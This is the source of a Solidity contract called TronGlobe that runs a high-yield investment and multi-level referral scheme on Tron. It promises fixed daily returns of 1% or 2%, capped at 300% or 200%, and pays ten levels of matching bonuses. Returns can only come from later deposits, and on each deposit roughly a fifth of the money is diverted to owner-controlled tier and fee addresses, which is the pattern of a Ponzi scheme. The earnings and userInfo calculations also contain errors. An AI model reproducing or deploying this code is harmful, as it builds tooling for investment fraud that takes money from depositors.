//SourceUnit: TronGlobe.sol

pragma solidity ^0.5.9;

contract TronGlobe {
    using SafeMath for uint;

    address payable public owner;

	address payable internal contract_;

    address payable public tier1_;
    address payable public tier2_;
    address payable public tier3_;

    uint public invested;
    uint public earnings;
    uint public withdrawn;
    uint public direct_bonus;
    uint public match_bonus;
    uint public cashBack_bonus;
    bool public compounding = true;
    
    uint private minDepositPlan1 = 500000000;
    uint private maxDepositPlan1 = 24999999999;
    uint private minDepositPlan2 = 25000000000;
    uint private maxDepositPlan2 = 1000000000000000000;
    
    
    uint private DailyRoi1 = 115741; // 1 Percent
    uint private DailyRoi2 = 231482; // 2 Percent
    
    
    uint private MaxRoi1 = 300; 
    uint private MaxRoi2 = 200; 
    
    
    
    address payable private feed1 = msg.sender;
    address payable private feed2 = msg.sender;
    address payable private feed3 = msg.sender;
    

    uint internal constant _tierR = 5;
    uint internal constant _divR = 2;

    uint internal constant direct_bonus_ = 10;

    uint internal lastUid = 1;

    uint[] public match_bonus_;

    uint[] public cashback_bonus_;

    

    bool public cashBack_ = true;




    DataStructs.Plan[] public plans;

    mapping(address => DataStructs.Player) public players;

    mapping(uint => address) public getPlayerbyId;

    event ReferralBonus(address indexed addr, address indexed refBy, uint bonus);
    event NewDeposit(address indexed addr, uint amount, uint tarif);
    event MatchPayout(address indexed addr, address indexed from, uint amount);
    event Withdraw(address indexed addr, uint amount);

   
       constructor(address payable _owner) public {
       
        owner = _owner;
        contract_ = msg.sender;
       

        match_bonus_.push(30); // l1
        match_bonus_.push(20); // l2
        match_bonus_.push(10); // l3&4
        match_bonus_.push(10); // l3&4
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10

        cashback_bonus_.push(25);
        cashback_bonus_.push(30);
        cashback_bonus_.push(40);
        cashback_bonus_.push(50);
        cashback_bonus_.push(70);
    }

    /**
     * Modifiers
     * */
    modifier hasDeposit(address _userId){
        require(players[_userId].deposits.length > 0);
        _;
    }

    modifier onlyContract(){
        require(msg.sender == contract_);
        _;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

 /**
     * Internal Functions
     * */
     
   function _getPack(uint _amount) private view returns(uint){
        require(_amount >= minDepositPlan1, 'Wrong amount');
        if(_amount >= minDepositPlan1 && _amount <= maxDepositPlan1){
            return 1;
        }
        if(_amount >= minDepositPlan2 && _amount <= maxDepositPlan2){
            return 2;
        }
       else{
            return 1;
        }
    }
    
    function _dailyroi(uint planId) private view returns(uint){
        require(planId >= 1 && planId <= 3);
        if(planId == 1){
            return DailyRoi1;
        }
        if(planId == 2){
            return DailyRoi2;
        }
        else{
            return DailyRoi1;
        }
    }
    
     function _maxroi(uint planId) private view returns(uint){
        require(planId >= 1 && planId <= 3);
        if(planId == 1){
            return MaxRoi1;
        }
        if(planId == 2){
            return MaxRoi2;
        }
        
        else{
            return MaxRoi1;
        }
    }
    
    
    function _matchingPayout(address _userId, uint _amount) private {
        address up = players[_userId].refBy;

        for(uint i = 0; i < match_bonus_.length; i++) {
            uint _bonus = _amount.mul(match_bonus_[i]).div(100);
            if(up == address(0)) {
                players[contract_].finances[0].available += _bonus;
                match_bonus += _bonus;
                earnings += _bonus;
                break;
            }
            
            uint GrossReceived = players[up].finances[0].total_earnings.add(_bonus); 
            
             if(GrossReceived < players[up].finances[0].max_payout){
            players[up].finances[0].available += _bonus;
            players[up].finances[0].total_match_bonus += _bonus;
            players[up].finances[0].total_earnings += _bonus;
            match_bonus += _bonus;
            earnings += _bonus;
            emit MatchPayout(up, _userId, _bonus);
            up = players[up].refBy;
        }      
        else{
            uint256 collectBonus_net = players[up].finances[0].max_payout.sub(players[up].finances[0].total_earnings); 
             
             if (collectBonus_net > 0) {
             
             if(collectBonus_net <= _bonus)
             { 
            players[up].finances[0].available += collectBonus_net;
            players[up].finances[0].total_match_bonus += collectBonus_net;
            players[up].finances[0].total_earnings += collectBonus_net;
            match_bonus += collectBonus_net;
            earnings += collectBonus_net;
            emit MatchPayout(up, _userId, collectBonus_net);
            up = players[up].refBy;
             }
             else{
            players[up].finances[0].available += _bonus;
            players[up].finances[0].total_match_bonus += _bonus;
            players[up].finances[0].total_earnings += _bonus;
            match_bonus += _bonus;
            earnings += _bonus;
            emit MatchPayout(up, _userId, _bonus);
            up = players[up].refBy;
             }
             }
              else{
            emit MatchPayout(up, _userId, 0);
            up = players[up].refBy;
              }
            }
            
           
        }
    }
 
   function _payDirectCom(address _refBy, uint _amount) private{
        uint bonus = _amount.mul(direct_bonus_).div(100);
        _checkout(_refBy);
        uint GrossReceived = players[_refBy].finances[0].total_earnings.add(bonus); 
        
        if(GrossReceived < players[_refBy].finances[0].max_payout){
        players[_refBy].finances[0].available += bonus;
        players[_refBy].finances[0].total_earnings += bonus;
        direct_bonus += bonus;
        earnings += bonus;
        emit ReferralBonus(msg.sender, _refBy, bonus);
        }      
        else{
            uint256 collectBonus_net = players[_refBy].finances[0].max_payout.sub(players[_refBy].finances[0].total_earnings); 
             
             if (collectBonus_net > 0) {
             
             if(collectBonus_net <= bonus)
             { 
             players[_refBy].finances[0].available += collectBonus_net;
             players[_refBy].finances[0].total_earnings += collectBonus_net;
             direct_bonus += collectBonus_net;
             earnings += collectBonus_net;
             emit ReferralBonus(msg.sender, _refBy, collectBonus_net);
             }
             else{
             players[_refBy].finances[0].available += bonus;
             players[_refBy].finances[0].total_earnings += bonus;
             direct_bonus += bonus;
             earnings += bonus;
             emit ReferralBonus(msg.sender, _refBy, bonus);
             }
             }
              else{
              emit ReferralBonus(msg.sender, _refBy, 0);
              }
            }

    }
      

  function _checkout(address _userId) private hasDeposit(_userId){
        DataStructs.Player storage player = players[_userId];
        if(player.deposits.length == 0) return;
        uint _minuteRate;
        uint _Interest;
        uint _myEarnings;
        
        for(uint i = 0; i < player.deposits.length; i++){
            DataStructs.Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = _dailyroi(dep.planId);
                _Interest = _maxroi(dep.planId).div(100);
                uint _gross = dep.amount.mul(secPassed).mul(_minuteRate).div(1e12);
                uint _max = dep.amount.mul(_Interest);
                uint _releasednet = dep.earnings;
                uint _released = dep.earnings.add(_gross);
                
                if(_released < _max){
                    _myEarnings += _gross;
                    dep.earnings += _gross;
                    dep.time = now;
                }
                
           else{
            uint256 collectProfit_net = _max.sub(_releasednet); 
             
             if (collectProfit_net > 0) {
             
             if(collectProfit_net <= _gross)
             {_myEarnings += collectProfit_net; 
             dep.earnings += collectProfit_net;
             dep.time = now;
             }
             else{
             _myEarnings += _gross; 
             dep.earnings += _gross;
             dep.time = now;}
             }
              else{
              
              dep.time = now;
              }
            }
                
}
        }
        
        uint MaxGrossEarnings = player.finances[0].total_earnings.add(_myEarnings);
        
        if(MaxGrossEarnings < player.finances[0].max_payout){
        player.finances[0].available += _myEarnings;
        player.finances[0].last_payout = now;
        player.finances[0].total_earnings += _myEarnings;
        earnings += _myEarnings;
        _matchingPayout(_userId, _myEarnings);
        }
        else{
        uint netEarnings = player.finances[0].max_payout.sub(player.finances[0].total_earnings);
        
         if (netEarnings > 0) {
             
             if(netEarnings <= _myEarnings)
             {
             player.finances[0].available += netEarnings;
             player.finances[0].last_payout = now;
             player.finances[0].total_earnings += netEarnings;
             earnings += netEarnings;
             _matchingPayout(_userId, netEarnings);
             }
             else{
        player.finances[0].available += _myEarnings;
        player.finances[0].last_payout = now;
        player.finances[0].total_earnings += _myEarnings;
        earnings += _myEarnings;
        _matchingPayout(_userId, _myEarnings);
             } 
             }
              else{
        player.finances[0].last_payout = now;
        }
         
        }
        
}



 function profitSpread(uint _amount) internal returns(bool){
        uint tier = _amount.mul(_tierR).div(100);
        uint _contract = _amount.mul(_divR).div(100);
        tier1_.transfer(tier);
        tier2_.transfer(tier);
        contract_.transfer(_contract);
        return true;
    }

    function _Register(address _addr, address _affAddr) private{

        address _refBy = _setSponsor(_addr, _affAddr);

        DataStructs.Player storage player = players[_addr];

        player.refBy = _refBy;

        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].refBy;
        address _affAddr3 = players[_affAddr2].refBy;
        address _affAddr4 = players[_affAddr3].refBy;
        address _affAddr5 = players[_affAddr4].refBy;
        address _affAddr6 = players[_affAddr5].refBy;
        address _affAddr7 = players[_affAddr6].refBy;
        address _affAddr8 = players[_affAddr7].refBy;

        players[_affAddr1].refscount[0].aff1sum = players[_affAddr1].refscount[0].aff1sum.add(1);
        players[_affAddr2].refscount[0].aff2sum = players[_affAddr2].refscount[0].aff2sum.add(1);
        players[_affAddr3].refscount[0].aff3sum = players[_affAddr3].refscount[0].aff3sum.add(1);
        players[_affAddr4].refscount[0].aff4sum = players[_affAddr4].refscount[0].aff4sum.add(1);
        players[_affAddr5].refscount[0].aff5sum = players[_affAddr5].refscount[0].aff5sum.add(1);
        players[_affAddr6].refscount[0].aff6sum = players[_affAddr6].refscount[0].aff6sum.add(1);
        players[_affAddr7].refscount[0].aff7sum = players[_affAddr7].refscount[0].aff7sum.add(1);
        players[_affAddr8].refscount[0].aff8sum = players[_affAddr8].refscount[0].aff8sum.add(1);

        player.playerId = lastUid;
        getPlayerbyId[lastUid] = _addr;

        lastUid++;
    }

    function _setSponsor(address _userId, address _refBy) private view returns(address){

        if(_userId != _refBy && _refBy != address(0) && (_refBy != tier3_ && _refBy != tier2_ && _refBy != tier1_)) {
            if(players[_refBy].deposits.length == 0) {
                _refBy = tier3_;
            }
        }

        if(_refBy == _userId || _refBy == address(0)){
            _refBy = contract_;
        }

        return _refBy;
    }

    /*
    * Only external call
    */

    function() external payable{

    }

    function deposit(address _refBy) external payable {
        
										  
        uint _amount = msg.value;
        address payable _userId = msg.sender;
        uint _planId = _getPack(_amount);

        require(_planId >= 1 && _planId <= 2, 'Wrong Plan');

        DataStructs.Player storage player = players[_userId];

        if(players[_userId].refBy == address(0)){
            _Register(_userId, _refBy);
        }

        player.deposits.push(DataStructs.Deposit({
            planId: _planId,
            amount: _amount,
            earnings: 0,
            time: uint(block.timestamp)
            }));
            
        uint _Interest = _maxroi(_planId).div(100); 
        uint _maxInterest = _amount.mul(_Interest);    

        player.finances[0].total_invested += _amount;
        player.finances[0].max_payout += _maxInterest;
        invested += _amount;
        
        if(players[_refBy].finances[0].total_invested > 0)
        {_payDirectCom(_refBy, _amount);}

        

        profitSpread(_amount);

        _checkout(_userId);

        if(cashBack_){
            _planId--;
           
            uint _cashBack = _amount.mul(cashback_bonus_[_planId]).div(1000);
            cashBack_bonus += _cashBack;
            earnings += _cashBack;
            
            player.finances[0].total_cashback += _cashBack;
            player.finances[0].total_earnings += _cashBack;
            _userId.transfer(_cashBack);
        }
        
        uint marketingfee = _amount.mul(8).div(100);
        uint marketingfee1 = _amount.mul(1).div(100);
        feed1.transfer(marketingfee);
        feed2.transfer(marketingfee1);
        feed3.transfer(marketingfee1);
        

        emit NewDeposit(_userId, _amount, _planId);
        
    }

    function withdraw() external hasDeposit(msg.sender){
        address payable _userId = msg.sender;

        _checkout(_userId);

        DataStructs.Player storage player = players[_userId];

        require(player.finances[0].available > 0 && address(this).balance > player.finances[0].available, "No Funds");

        uint amount = player.finances[0].available;

        player.finances[0].available = 0;
        player.finances[0].total_withdrawn += amount;
        withdrawn += amount;

        _userId.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function reinvest() external hasDeposit(msg.sender){
        // Take available and redeposit for compounding
        address _userId = msg.sender;
        _checkout(_userId);

        DataStructs.Player storage player = players[_userId];
        uint _amount = player.finances[0].available;
        require(address(this).balance >= _amount);

        player.finances[0].available = 0;
        player.finances[0].total_invested += _amount;
        player.finances[0].total_withdrawn += _amount;
        invested += _amount;
        withdrawn += _amount;

        _payDirectCom(player.refBy, _amount);

        profitSpread(_amount);
        
        uint marketingfee = _amount.mul(8).div(100);
        uint marketingfee1 = _amount.mul(1).div(100);
        feed1.transfer(marketingfee);
        feed2.transfer(marketingfee1);
        feed3.transfer(marketingfee1);
    }

 
   function _getEarnings(address _userId) view external returns(uint) {

        DataStructs.Player storage player = players[_userId];
        if(player.deposits.length == 0) return 0;
        uint _minuteRate;
        uint _Interest;
        uint _myEarnings;

        for(uint i = 0; i < player.deposits.length; i++){
            DataStructs.Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = _dailyroi(dep.planId);
                _Interest = _maxroi(dep.planId).div(100);
                uint _gross = (dep.amount.mul(secPassed.mul(_minuteRate))).div(1e12);
				uint _max = dep.amount.mul(_Interest);
                       
        uint _releasednet = dep.earnings;
        uint _released = player.finances[0].total_earnings.add(_gross);
        if(_released < _max){
                    _myEarnings += _gross;
                }
            else{
            uint256 collectProfit_net = _max.sub(_releasednet); 
             
             if (collectProfit_net > 0) {
             
             if(collectProfit_net <= _gross)
             {_myEarnings += collectProfit_net; 
             }
             else{
             _myEarnings += _gross; 
             }
             }
              else{
              _myEarnings += 0;
              }
            }
        }
        }
        
        uint MaxGrossEarnings = player.finances[0].total_earnings.add(_myEarnings);
        
        if(MaxGrossEarnings < player.finances[0].max_payout){
        return player.finances[0].available.add(_myEarnings);
        }
        else{
        uint netEarnings = player.finances[0].max_payout.sub(player.finances[0].total_earnings);
        
         if (netEarnings > 0) {
             
             if(netEarnings <= _myEarnings)
             {
             return player.finances[0].available.add(netEarnings);
             }
             else{
        return player.finances[0].available.add(_myEarnings);
             } 
             }
              else{
        return player.finances[0].available;
        }
         
        }
 }



    function userInfo(address _userId) view external returns(uint for_withdraw, uint total_invested, uint total_withdrawn,
        uint total_match_bonus, uint total_cashback, uint aff1sum) {
        DataStructs.Player storage player = players[_userId];

        uint _myEarnings = this._getEarnings(_userId).add(player.finances[0].available);

        return (
        _myEarnings,
        player.finances[0].total_invested,
        player.finances[0].total_withdrawn,
        player.finances[0].total_match_bonus, player.finances[0].total_cashback,
        player.refscount[0].aff1sum);
    }

    function contractInfo() view external returns(uint, uint, uint, uint, uint, uint, uint, uint) {
        return (invested, withdrawn, earnings.add(withdrawn), direct_bonus, match_bonus, lastUid, cashBack_bonus, address(this).balance);
    }

    /**
     * Restrictied functions
     * */

	function setOwner(address payable _owner) external onlyContract()  returns(bool){
        owner = _owner;
        return true;
    }

    function transferOwnership(address payable _owner) external onlyOwner()  returns(bool){
        owner = _owner;
        return true;
    }

    function setTiers(address payable _tier1, address payable  _tier2, address payable _tier3) external onlyOwner() returns(bool){
        if(_tier1 != address(0)){
            tier1_ = _tier1;
        }
        if(_tier2 != address(0)){
            tier2_ = _tier2;
        }
        if(_tier3 != address(0)){
            tier3_ = _tier3;
        }
        return true;
    }

    function tooggleCompounding() external onlyOwner() returns(bool){
        compounding = !compounding ? true:false;
        return true;
    }


    function _cashbackToggle() external onlyOwner() returns(bool){
        cashBack_ = !cashBack_ ? true:false;
        return cashBack_;
    }

    function setCashback(uint _star1Cashback, uint _star2Cashback, uint _star3Cashback, uint _star4Cashback, uint _star5Cashback) external onlyOwner() returns(bool){
        cashback_bonus_[0] = _star1Cashback.mul(10);
        cashback_bonus_[1] = _star2Cashback.mul(10);
        cashback_bonus_[2] = _star3Cashback.mul(10);
        cashback_bonus_[3] = _star4Cashback.mul(10);
        cashback_bonus_[4] = _star5Cashback.mul(10);
        return true;
    }
    
    
    function updateFeed1(address payable _address) public {
       require(msg.sender==owner);
       feed1 = _address;
    }
    
     function updateFeed2(address payable _address) public {
       require(msg.sender==owner);
       feed2 = _address;
    }
    
       function updateFeed3(address payable _address) public {
       require(msg.sender==owner);
       feed3 = _address;
    }
    

   /**
     * To save people's money from hacking...
     */
     

    
}

contract TronGlobe_{

    struct Deposit {
        uint planId;
        uint amount;
        uint earnings; // Released = Added to available
        uint time;
    }

    struct Player {
        address refBy;
        uint available;
        uint total_earnings;
        uint total_direct_bonus;
        uint total_match_bonus;
        uint total_invested;
        uint max_payout;
        uint last_payout;
        uint total_withdrawn;
        Deposit[] deposits;
    }

    mapping(address => Player) public players;

    function _getEarnings(address _userId) external view returns(uint){}


						  
    function userInfo(address _userId) external view returns(uint, uint, uint, uint){}

}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

library DataStructs{
    struct Plan{
        uint minDeposit;
        uint maxDeposit;
        uint dailyRate;
        uint maxRoi;
    }

    struct Deposit {
        uint planId;
        uint amount;
        uint earnings; // Released = Added to available
        uint time;
    }

    struct RefsCount{
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
    }

   
	 


    struct Finances{
        uint available;
        uint total_earnings;
        uint total_direct_bonus;
        uint total_match_bonus;
        uint total_cashback;
        uint total_invested;
        uint max_payout;
        uint last_payout;
        uint total_withdrawn;
    }

    struct Player {
        uint playerId;
        address refBy;
        Finances[1] finances;
        Deposit[] deposits;
        RefsCount[1] refscount;
        
    }
}